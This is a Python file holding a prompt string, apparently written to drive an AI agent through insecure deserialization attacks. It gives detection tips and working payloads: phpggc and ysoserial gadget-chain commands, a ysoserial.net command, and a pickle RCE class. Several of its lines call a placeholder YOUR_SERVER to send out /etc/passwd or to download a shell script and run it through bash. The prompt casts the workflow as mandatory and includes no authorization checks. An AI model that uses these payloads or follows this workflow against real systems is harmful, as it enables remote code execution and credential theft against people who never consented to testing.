"""
Insecure Deserialization Attack Skill Prompt.
"""
DESERIALIZATION_SKILL_PROMPT = """
## ATTACK SKILL: INSECURE DESERIALIZATION

**CRITICAL: This attack skill has been CLASSIFIED as deserialization.**
**Follow the deserialization workflow below.**

---

### MANDATORY WORKFLOW

#### STEP 1: DETECTION — Identify Serialization Format

Look for base64-encoded data in cookies, headers, hidden fields, API bodies:
- **PHP**: `Tzo0OiJVc2VyIjoyOntzOjQ6Im5hbWUiO...` → `O:4:"User"` → PHP serialize
- **Java**: `rO0ABXNy...` → `ac ed 00 05` magic bytes → Java ObjectInputStream
- **.NET**: Base64 with type info `<ResourceDictionary`, `<BinaryFormatter`
- **Python**: Base64 starting with `gASV` → pickle
- **Ruby**: Base64 starting with `BAhv` → Marshal
- **Node.js**: JSON with `__type`, `__className`, or `node-serialize` prefix

```bash
# Decode base64 and check first bytes
echo "rO0ABXNy..." | base64 -d | xxd | head -1
# ac ed 00 05 = Java serialized
# 80 02 = Python pickle protocol 2
# 04 08 = Ruby Marshal
```

#### STEP 2: PHP UNSERIALIZE EXPLOITATION

Use PHPGGC to generate gadget chains:
```bash
phpggc -l                    # list gadget chains
phpggc Monolog/RCE1 system id  # generate RCE payload
phpggc -b Monolog/RCE1 system 'curl http://YOUR_SERVER/$(cat /etc/passwd)'
```

Common PHP gadget frameworks: Monolog, SwiftMailer, Guzzle, Laravel, Symfony, Doctrine, Yii, Zend.

#### STEP 3: JAVA DESERIALIZATION

Use ysoserial:
```bash
java -jar ysoserial.jar CommonsCollections6 'curl http://YOUR_SERVER/shell.sh|bash' | base64
```

Common Java gadgets: CommonsCollections 1-7, CommonsBeanutils, Spring, Groovy, Jdk7u21, Jdk8u20, URLDNS (detection), JRMPClient/Listener.

#### STEP 4: PYTHON PICKLE EXPLOITATION

```python
import pickle, os, base64
class RCE:
    def __reduce__(self):
        return (os.system, ('curl http://YOUR_SERVER/$(cat /etc/passwd)',))
payload = base64.b64encode(pickle.dumps(RCE())).decode()
```

#### STEP 5: .NET DESERIALIZATION

Use ysoserial.net:
```bash
ysoserial.net -g ObjectDataProvider -f BinaryFormatter -c "cmd /c whoami" -o base64
```

#### ANTI-PATTERNS: Don't guess the framework — check response headers, cookies, and error messages first. Test with URLDNS (Java) first — it's harmless and confirms deserialization.
"""
